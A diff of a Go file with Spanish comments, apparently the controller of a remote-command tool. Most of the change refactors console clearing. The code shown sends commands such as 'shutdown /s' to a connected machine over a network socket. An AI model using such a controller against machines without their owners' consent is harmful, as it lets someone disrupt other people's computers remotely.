@@ -68,24 +68,6 @@ func envio(conexiones net.Conn, envio string) error {
 	return nil
 }
 
-// abstraigo la funcion para borrar consola
-func Borrar_consola() error {
-	if runtime.GOOS == "windows" {
-		comandos := exec.Command("powershell", "-command", "clear")
-		comandos.Stdout = os.Stdout
-		comando_error := comandos.Run()
-		fmt.Println(color.Violeta + color.LOGO + color.Reset)
-		if comando_error != nil {
-			return errors.New("[!] error al ejecutar comando")
-		}
-
-	} else {
-		fmt.Print("\033[2J")
-
-	}
-	return nil
-}
-
 // funcion cuyo proposito es la ejecucion de comandos
 func Comando(conexiones net.Conn) error {
 	// error que fuerza la recnexion para evitar problemas de desincronizacion con el host
@@ -94,20 +76,19 @@ func Comando(conexiones net.Conn) error {
 	//println(color.Violeta + INSTRUCCION + color.Reset)
 
 	eleccion := consola.Menu(Instrucciones)
+	fmt.Print("\n")
 
 	switch eleccion {
 	case OP1: // borrar consola
-		err := Borrar_consola()
-		if err != nil {
-			fmt.Println(err)
-		}
+
+		consola.Borrar_consola()
 
 	case OP2: // apagar equipo
 		err := envio(conexiones, "shutdown /s")
 		if err != nil {
 			return err
 		}
-	case OP3: // automatizacion de msg para ciertas ediciones de windows
+	case OP3:
 
 		mensaje := input.Input("mensaje >> ")
 
@@ -117,6 +98,7 @@ func Comando(conexiones net.Conn) error {
 		fmt.Println(color.Verde + "\n[!] saliendo...\n" + color.Reset)
 		envio(conexiones, "q")
 		defer conexiones.Close()
+		fmt.Print("\033[?1049l")
 		os.Exit(0)
 
 	case OP5:
